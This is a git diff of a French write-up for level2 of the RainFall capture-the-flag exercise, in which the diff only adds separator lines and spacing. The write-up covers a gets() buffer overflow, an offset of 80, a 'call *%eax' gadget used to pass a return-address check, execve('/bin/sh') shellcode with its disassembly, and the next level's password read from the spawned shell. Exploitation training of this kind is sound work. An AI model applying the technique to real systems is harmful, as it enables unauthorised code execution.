@@ -18,6 +18,8 @@ Comme d'habitude on consate un <main> ainsi qu'une fonction <p>, celle ci est ap
 On constate de nouveau la présence de la fonction gets() au sein de <p>. Or comme stipulée dans le level1 : cette dernière est sujet à une faille que 
 nous pouvons exploiter via un bufferoverflow.
 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 Calculons la taille du buffer cette fois ci à l'aide du site web : https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
 
 (gdb) r
@@ -30,6 +32,8 @@ Program received signal SIGSEGV, Segmentation fault.
 
 On trouve en entrant 0x37634136 dans le site web un offset de 80, qui correspond à la taille de notre buffer.
 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 Cependant il ne sera pas possible de procéder de la meme façon qu’au level1, en effet on peut voir que l'EIP SAVED est soumise à une verification :
 
 $> (gdb) disas p
@@ -40,7 +44,7 @@ $> (gdb) disas p
     0x08048500 <+44>:	cmp     $0xb0000000,%eax 		(3) Comparaison
     0x08048505 <+49>:	jne     0x8048527 <p+83>
     ….
-    0x08048522 <+78>:	call    0x80483d0 <_exit@plt>	(4) Exit
+    0x08048522 <+78>:	call    0x80483d0 <_exit@plt>   (4) Exit
     0x08048527 <+83>:	lea    -0x4c(%ebp),%eax 
 
 
@@ -52,6 +56,7 @@ $> (gdb) info proc map
 Start Addr 	   End Addr      Size       Offset objfile
 0xbffdf000 	   0xc0000000    0x21000    0x0 [stack]
 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 On remarque, en mettant un break  sur le return de la fonction <p> que notre registre EAX contient 
 l’adresse de notre buffer :
@@ -71,6 +76,8 @@ $> (gdb) x/s 0x804a008
 Il serait donc possible d’exécuter un shellcode contenu dans notre buffer via notre input si nous pouvions réécrire EIP SAVED avec l’adresse d’une instruction 
 faisant appel à EAX.
 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 Cherchons l’adresse d’une instruction hors stack qui fait appel au registre EAX :
 
 >$ level2@RainFall:~$ objdump -d level2 | grep 'call' | grep 'eax'
@@ -80,6 +87,8 @@ Cherchons l’adresse d’une instruction hors stack qui fait appel au registre 
     80485eb:	ff d0                	call   *%eax
 
 Nous utiliserons 080484cf.
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Nous avons notre offset 80, l’adresse d’une instruction qui appelle EAX 80484cf, un shellcode execve(/bin/sh) trouver sur exploit-db … Let’s do it :
 
@@ -91,7 +100,10 @@ Nous avons notre offset 80, l’adresse d’une instruction qui appelle EAX 8048
     level3
     cat /home/user/level3/.pass
     492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
-    
+ 
+ Next...
+ 
+ --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 EXPLICATION DU SHELLCODE :
 
@@ -111,4 +123,3 @@ f:  89 e3                 mov    ebx,esp     ;; ebx = esp (esp = @"/bin//sh\0")
 16: b0 01                 mov    al,0x1      ;; eax = 1 (sys_call_exit)
 18: cd 80                 int    0x80        ;; call exit(ebx)
 
-Next …
